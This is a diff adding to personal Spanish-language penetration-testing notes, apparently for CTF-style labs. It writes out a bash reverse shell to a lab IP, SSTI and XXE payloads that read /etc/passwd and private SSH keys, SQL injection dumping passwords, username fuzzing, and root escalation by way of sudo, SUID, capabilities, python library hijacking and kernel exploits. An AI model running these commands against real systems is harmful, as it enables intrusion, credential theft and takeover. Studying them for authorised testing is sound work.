@@ -4,6 +4,28 @@ reverse shell monkey pentester (para buscar formas de obtener una reverse shell 
 
 hashes.org para crackear hashes :)))
 
+// VULNERABILIDADES IMPORTANTES
+
+dirtypipe
+
+
+
+
+
+
+
+//REVERSE SHELLS
+
+bash -c "bash -i >& /dev/tcp/10.10.14.10/443 0>&1"
+
+
+--------------------------------///////\\\\\\\--------------------------------------
+
+// CONVERTIDORES DE BASE64/HEX/MD5 Y DEMAS
+
+
+Para Hexadecimal a texto
+echo "cadena" | xargs | xxd -ps -r    
 
 --------------------------------///////\\\\\\\--------------------------------------
 
@@ -18,13 +40,41 @@ tcp-sync-port-scan
 //nmap con puertos ya descubiertos
 nmap -sC -sV -p(pego los puertos) IP -oN targeted
 
+
+//nmap para puertos udp
+
+nmap -sU --top-ports 100 -T5 --open -v -n IP
+
+
 --------------------------------///////\\\\\\\-------------------------------------- 
+
+
+// UDP PORTS
+
+Para puertos udp el mas comun es el 161 que corre el servicio snmp.
+
+'snmpwalk -c public -v2c IP 1' es el comando mas usado. siendo public el community mas usado.
+
+con 'onesixtyone IP -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtone.txt' podemos
+encontrar community strings.
+
+
+--------------------------------///////\\\\\\\--------------------------------------
+
 
 //WFUZZ ANALIZO DIRECTORIOS EN UN HTTP/HTTPS
 
 wfuzz -c -L -t 400 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://IP/FUZZ
 
 wfuzz -c -L -t 400 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w /usr/share/wordlists/ext.txt http://IP/FUZZ.FUZ2Z
+
+---
+
+wfuzz -c -L -t 400 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -d 'usuario=FUZZ&password=test' http://IP/paneldelogin.php
+
+esto sirve para fuzzear un usuario potencial. ocultariamos los caracteres que salen mucho con -hh y listo! 
+
+---
 
 --------------------------------///////\\\\\\\-------------------------------------- 
 
@@ -36,14 +86,22 @@ wpscan --url http//IP -e vp,u
 
 // TRATAMIENTO DE LA TTY
 
+si no tenemos una bash tenemos que:
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+
+
+primero q todo hago esto
+
+script /dev/null -c bash
+
 1) le doy Ctrl + Z para poner en segundo plano la consola
-2) Escribo el comando "stty raw -echo" 
-3) "fg" no se va a ver en consola pero le doy enter igual
-4) "reset"
-5) Elijo el tipo de terminal. ej:"xterm"
-6) "export TERM=xterm" porque todavia no esta la xterm
-7) "export SHELL=bash" porque todavia no tengo la /bin/bash
-8) Para las filas y columnas le doy "stty rows 52 columns 187"
+2) Escribo el comando "stty raw -echo;fg" 
+3) "reset xterm"
+4) "export TERM=xterm" porque todavia no esta la xterm
+5) "export SHELL=bash" porque todavia no tengo la /bin/bash
+6) Para las filas y columnas le doy "stty rows 52 columns 187"
 
 --------------------------------///////\\\\\\\--------------------------------------
 
@@ -274,6 +332,23 @@ seleccionamos el 1 y le damos a "add"
 nos vamos a payload y le damos a numbers from 1 a 65535. step 1
 le damos a start attack y los que den un length mas largo de lo comun es q generalmente esta abierto.
 
+------
+----Server-Side-Template-Inyection----
+------
+
+aca podriamos ver un input que se vea reflejado en la pagina entonces hariamos lo siguiente:
+
+para probar si es un SSTI podriamos hacer esto:
+
+poner en el input este codigo  {{7*7}}
+si ese codigo nos refleja 49, entonces es vulnerable y accederiamos a la pagina de payloadallthethings en github.
+ahi nos vamos al apartado de ssti y copiamos un codigo y probamos.
+
+este es muy comun: {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+											     ^
+											     |
+								           aca ponemos el comando que queramos.
+
 
 --------------------------------///////\\\\\\\----------------------------------
 
@@ -350,7 +425,9 @@ union select 1,column_name,3,4,...,n from information_schema.columns where table
 una vez que tengamos todo lo deseado y querramos ver contrasenas, usuarios, etc, podriamos hacer lo siguiente:
 union select 1,concat(username,0x,password),3,4,...,n from dbencontrada.tablaencontrada-- -
 
+o tambien podria ser solo asi:
 
+union select 1,group_concat(username,0x3a,password),3,4,...,n from tablaencontrada-- -
 
 
 si por alguna razon cuando queremos inyectar el nombre de una tabla, schema o columna no nos deja podriamos hacer lo
@@ -407,23 +484,80 @@ la proxima vez que lo querramos hacer vamos a tener que poner admin== y asi suce
 
 --------------------------------///////\\\\\\\----------------------------------
 
-// SMB CLIENT
-crackmapexec smb IP
+// SHELLSHOCK ATTACK
 
-smbclient -L IP -N
-           ^     ^
-           |    Null session
-         List  
+Cuando entramos a un webmin, ponemos un usuario y contrasena por ejemplo: admin admin
+y no entra, en la barra de direcciones nos sale un archivo .cgi , .pl o .sh.
+se trata de un shellshock attack.
 
-smbmap -H IP 
-        ^
-        |
- Listado de permisos
+buscamos en el buscador "shellshock attack how attackers" y le damos al plrimer "blog".
+esta pagina nos muestra como cambiar el user agent para este caso.
 
-Nos fijamos cuales de los siguientes tienen permiso de lectura y escritura.
 
-Y ahora ponemos:
-smbclient //IP/directorio -N
+--------------------------------///////\\\\\\\----------------------------------
+
+
+// XML EXTERNAL ENTITY INYECTION (XXE)
+
+cuando haya posibilidad de un xxe podriamos hacer esto:
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+!DOCTYPE foo [
+	<!ELEMENT foo ANY >
+	<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+aca abajo lo que nos pida poner y reemplazamos un texto por <&xxe;>
+
+llamamos a ese archivo file.xml
+
+tambien, en lugar de buscar por el /etc/passwd podriamos mirar el 
+/home/usuario/.ssh/id_rsa
+para encontrar la clave rsa privada.
+
+una vez encontrada copiamos desde ------begin rsa private key-------
+hasta ------end rsa private key--------
+con esos dos incluidos.
+
+y nos creamos un archivo llamado id_rsa y pegamos la clave entera.
+
+le asignamos el privilegio 600:
+chmod 600 id_rsa
+
+luego para entrar por ssh hariamos:
+
+ssh -i id_rsa USUARIO@IP 
+
+y ya esta!
+
+
+--------------------------------///////\\\\\\\----------------------------------
+
+// VIRTUAL HOSTING
+
+para ver si se esta aplicando virtual hosting podemos usar la herramienta dig:
+
+dig @IP dns
+
+por ejemplo:
+
+dig @190.210.186.109 arsec.com.ar <valores>
+
+en valores podemos poner los siguientes:
+
+-ns para encontrar servidores ns
+-mx para encontrar servidores de mail
+-axfr encontramos subdominios validos
+
+entonces todos los subdominios validos los ponemos en el /etc/hosts de la siguiente forma.
+ponemos el dominio y al lado los subdominios por ejemplo:
+
+10.10.10.123 uploads.friendzone.red
+
+
+--------------------------------///////\\\\\\\----------------------------------
+
+// INSECURE DESERIALIZATION
+
+no entendi un pingo	
 
 
 --------------------------------///////\\\\\\\----------------------------------
@@ -437,6 +571,17 @@ en esta pagina simplemente buscamos el comando y vemos lo que tenemos que hacer 
 
 
 
+
+---EXPLOTACION-DEL-SUDOERS----
+
+Si el usuario en el que estamos actuando tiene permisos sudoers, es decir, le dieron
+algun permiso en el /etc/sudoers, en principio no lo sabemos. Lo que podemos hacer
+es un sudo -l para ver si tiene permisos sudoers. Si tiene alguno va a aparecer ahi.
+
+Para explotarlo simplemente nos vamos a la pagina gtfobins.github.io y ahi buscamos
+el comando en el que tenemos privilegios y en el apartado sudo vemos lo que tenemos
+q hacer.
+ 
 ---EXPLOTACION-DE-PERMISO-SUID----
 
 para asignar un permiso suid seria chmod 4<755> por ejemplo.
@@ -444,5 +589,85 @@ para asignar un permiso suid seria chmod 4<755> por ejemplo.
 buscamos privilegios suid de la siguiente forma:
 ---> find \-perm -4000
 
+nos fijamos en alguno fuera de lo normal y lo buscamos en gtfo.
 
---- 
+---EXPLOTACION-DE-CAPABILITIES---- 
+
+
+Con 'getcap -r / 2>/dev/null' podemos ver las capabilities. podriamos ejecutar este comando:
+
+binario_corriendo -r "posix_setuid(0); system('/bin/bash');"
+
+y listo!
+
+
+---LIBRARY-HIJACKING----
+
+si tenemos permisos de sudo en pyhton, por ejemplo,
+podriamos ver el path de una libreria, ejemplo (sys):
+
+python
+import sys
+print sys.path
+
+si con esos comandos vemos que el primer directorio es el actual o tenemos
+permiso de escritura en algun diectorio antes de la libreria, podriamos
+hacer lo siguiente:
+
+nos creamos un archivo cualquiera:
+
+nano javi.py
+
+dentro de ese archivo ponemos esto (ES UN EJEMPLO): 
+
+-----------------------------------------------------
+
+#!/usr/bin/python
+
+import hashlib, sys
+
+if len(sys.argv) != 2:
+        print"hola"
+        sys.exit(1)
+
+if __name__ == '__main__':
+        palabra = sys.argv[1]
+
+        md5 = hashlib.md5(palabra).hexdigest()
+
+        print md5
+
+-------------------------------------------------------
+En el lugar donde dice import es la libreria que vamos a crear
+con el comando malicioso para ser root.
+
+ahora creariamos la libreria nosotros mismos:
+
+nano hashlib.py
+
+y dentro ponemos esto:
+
+--------------------------------------------------------
+
+import os
+
+os.setuid(0)
+os.system("/bin/bash")
+
+--------------------------------------------------------
+
+ahora ejecutamos el exam.py y guala!
+
+
+---EXPLOTACION-DEL-KERNEL----
+
+Hacemos un 'uname -a' en la consola y nos va a salir algo como esto
+
+Linux <nombre> version-algo-mas y mas cosas.
+
+Donde version puede ser igual a 2.6.31.
+Nos copiariamos la version y en google  (o searchsploit)
+buscamos 2.6.31 exploit kernel.
+Ahi seguimos instrucciones.
+
+Generalmente si es menor a 4.x.x podemos hacer cositas.
